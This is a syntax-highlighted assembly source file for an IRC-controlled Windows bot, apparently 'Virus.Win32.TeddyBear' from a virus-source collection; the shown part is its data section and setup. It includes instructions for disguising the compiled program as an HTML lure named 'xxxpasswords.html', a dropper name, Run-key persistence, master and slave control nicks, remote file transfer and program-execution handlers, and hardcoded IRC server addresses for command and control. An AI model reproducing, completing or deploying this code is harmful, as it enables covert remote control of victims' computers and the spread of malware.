<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win32.TeddyBear - ircbot.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">; after compiling, open ircbot.exe, go to offset 2 (right after MZ) and write '&lt;!--'</span><span class="sc0">
</span><span class="sc1">; this will make the code disappear in the dropped html file 'xxxpasswords.html'</span><span class="sc0">




</span><span class="sc9">includelib</span><span class="sc0"> </span><span class="sc5">kernel32.lib</span><span class="sc0">
</span><span class="sc9">includelib</span><span class="sc0"> </span><span class="sc5">user32.lib</span><span class="sc0">
</span><span class="sc9">includelib</span><span class="sc0"> </span><span class="sc5">wsock32.lib</span><span class="sc0">
</span><span class="sc9">includelib</span><span class="sc0"> </span><span class="sc5">advapi32.lib</span><span class="sc0">
</span><span class="sc9">includelib</span><span class="sc0"> </span><span class="sc5">rasapi32.lib</span><span class="sc0">

</span><span class="sc2">.486</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">stdcall</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc10">c</span><span class="sc4">:</span><span class="sc0">\</span><span class="sc5">masm</span><span class="sc0">\</span><span class="sc9">include</span><span class="sc0">\</span><span class="sc5">windows.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc10">c</span><span class="sc4">:</span><span class="sc0">\</span><span class="sc5">masm</span><span class="sc0">\</span><span class="sc9">include</span><span class="sc0">\</span><span class="sc5">wsock32.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc10">c</span><span class="sc4">:</span><span class="sc0">\</span><span class="sc5">masm</span><span class="sc0">\</span><span class="sc9">include</span><span class="sc0">\</span><span class="sc5">kernel32.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc10">c</span><span class="sc4">:</span><span class="sc0">\</span><span class="sc5">masm</span><span class="sc0">\</span><span class="sc9">include</span><span class="sc0">\</span><span class="sc5">user32.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc10">c</span><span class="sc4">:</span><span class="sc0">\</span><span class="sc5">masm</span><span class="sc0">\</span><span class="sc9">include</span><span class="sc0">\</span><span class="sc5">advapi32.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc10">c</span><span class="sc4">:</span><span class="sc0">\</span><span class="sc5">masm</span><span class="sc0">\</span><span class="sc9">include</span><span class="sc0">\</span><span class="sc5">rasapi32.inc</span><span class="sc0">

        </span><span class="sc5">CRLF</span><span class="sc0">                    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0a0dh</span><span class="sc0">
        </span><span class="sc5">Magic</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc3">"cRIV"</span><span class="sc0">
        </span><span class="sc5">NumSlaves</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">5</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">
        </span><span class="sc5">online</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">Temp</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">RandomNumber</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">hKey</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">CR</span><span class="sc0">                      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">LF</span><span class="sc0">                      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">Space</span><span class="sc0">                   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">" "</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">ExclamanationMark</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"!"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


        </span><span class="sc5">sin_family</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">AF_INET</span><span class="sc0">
        </span><span class="sc5">sin_port</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">2842</span><span class="sc0">    </span><span class="sc1">; 6667</span><span class="sc0">
        </span><span class="sc5">sin_addr</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">sin_zero</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">SocketPtr</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">Recvs</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">        


        </span><span class="sc5">TemporaryBuffert</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">InBuffertPtr</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">BuffertPtr</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">StrBuffert</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">Buffs</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">9</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc5">DebugFilePtr</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">DebugFilename</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"irc.txt"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">DataFilePtr</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">DataFilename</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"script.dat"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">ScriptInMem</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">ScriptFileSize</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        
        </span><span class="sc5">Aligment</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">MyNick</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">MyIdent</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">MyRealName</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">God</span><span class="sc0">                     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">Leader</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">Slaves</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">Slave1</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">Slave2</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">Slave3</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">Slave4</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">Slave5</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Msg1</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"01"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Msg2</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"02"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Msg3</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"03"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Msg4</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"04"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Msg5</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"05"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Msg6</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"06"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Msg7</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"07"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ErrorMsg</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc3">"Step"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">



        </span><span class="sc5">IgnoreNicks</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


        </span><span class="sc5">IRCIpNumbers</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; this creates a CCh byte</span><span class="sc0">
        </span><span class="sc5">IRCCurrentIp</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


        </span><span class="sc5">HostIpAddress</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">MessageHandler</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">DownloadedFiles</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">SendingNick</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">SendingCommand</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">scriptExeName</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"script.exe"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">ExeAlign</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">ExeNamePtr</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">SendVirusName</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"xxxpasswords.html"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">DropVirusName</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Dllmgr.exe"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">ThreadSendString</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">400</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc5">SendMyNickInfo</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"NICK $mynick"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">SendMyUserInfo</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"USER $username . . :$realname"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">DollarReplacements</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"mynick"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">MyNick</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"username"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">MyIdent</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"realname"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">MyRealName</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"god"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">God</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"leader"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Leader</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"slaves"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Slaves</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"slave1"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Slave1</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"slave2"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Slave2</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"slave3"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Slave3</span><span class="sc0"> 

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"slave4"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Slave4</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"slave5"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Slave5</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"nick"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">SendingNick</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"recv"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">RecvPtr</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"path"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">PathPtr</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


        </span><span class="sc5">StackUsed</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">4000</span><span class="sc0">

</span><span class="sc5">Functionlist</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">RestartAllFuckingThings</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">DCCRecvFunction</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">DCCRecvFunction</span><span class="sc0">  </span><span class="sc1">; chat</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">DCCSendFunction</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">QuitFunction</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">NewSlaveFunction</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">ShouldRecieveProgram</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">GenerateNewNick</span><span class="sc0">
        
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">ExecuteProgram</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">DirFunction</span><span class="sc0">


        </span><span class="sc5">RecvPtr</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">RecvString</span><span class="sc0">
        </span><span class="sc5">PathPtr</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">PathString</span><span class="sc0">
</span><span class="sc1">; Strings</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">PRIVMSGNick</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"PRIVMSG $recv :"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">NoPlaceString</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"PRIVMSG $recv :No, ask $slave1"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">ERR_PARSE</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Error parsing message!"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">NickStr</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$nick"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">YouGotFileStr</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SEND:"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">GetFileString</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"PRIVMSG $recv :DCC $3"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">Worked</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Worked"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">NickCommand</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"NICK 1234567890"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">RecvString</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">300</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">PathString</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"c:\windows\system"</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc5">ErrorStr</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Error"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">RegSubKey</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Software\Microsoft\Windows\CurrentVersion\Run"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">RegName</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Teddybear"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">







</span><span class="sc9">.code</span><span class="sc0">


</span><span class="sc1">; This scriptfile is used to recieve a more advanced (and bigger) scriptfile</span><span class="sc0">
</span><span class="sc1">; If there already exist a scriptfile then this isnt used</span><span class="sc0">

        </span><span class="sc5">NULL</span><span class="sc0">                    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">EndOfList</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">NoScan</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc5">s_ScriptSize</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">s_End</span><span class="sc4">-</span><span class="sc5">s_Header</span><span class="sc0">
        </span><span class="sc5">s_ConnectFunction</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc5">s_DCCRecvFunction</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc5">s_DCCChatFunction</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">

        </span><span class="sc5">s_DCCSendFunction</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc5">s_QuitFunction</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc5">s_NewSlaveFunctions</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc5">s_ShouldRecieveProgram</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">7</span><span class="sc0">

   </span><span class="sc5">s_Header</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">s_Magic</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"VIRc"</span><span class="sc0">
        </span><span class="sc5">s_Alignment</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc2">401000h</span><span class="sc0">

        </span><span class="sc5">s_User</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">s_Userinfo</span><span class="sc0">
        </span><span class="sc5">s_Slaves</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">s_SlaveNames</span><span class="sc0">
        </span><span class="sc5">s_Ignores</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">s_IgnoreNames</span><span class="sc0">
        </span><span class="sc5">s_IRCServers</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">s_IPList</span><span class="sc0">

        </span><span class="sc5">s_MessageParsePtr</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">s_MessageParseData</span><span class="sc0">

        </span><span class="sc5">s_DownloadedFiles</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">s_ListOfDownloadedFiles</span><span class="sc0">

   </span><span class="sc5">s_EndOfHeader</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------- User info</span><span class="sc0">

   </span><span class="sc5">s_Userinfo</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">s_Nickname</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">s_Ident</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Nick"</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc4">-(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">s_Ident</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">s_RealName</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"DrSolomon"</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc4">-(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">s_RealName</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">s_God</span><span class="sc0">                   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"VirusGod"</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc4">-(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">s_God</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">s_Leader</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"VirusGod"</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc4">-(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">s_Leader</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc5">s_SlaveNames</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc5">s_IgnoreNames</span><span class="sc4">:</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

</span><span class="sc1">; ----------- List of IP addresses of undernet IRC servers</span><span class="sc0">

  </span><span class="sc5">s_IPList</span><span class="sc0">                      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"192.160.127.97"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"130.243.35.1"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; efnet</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"203.37.45.2"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"209.47.75.34"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"195.154.203.241"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
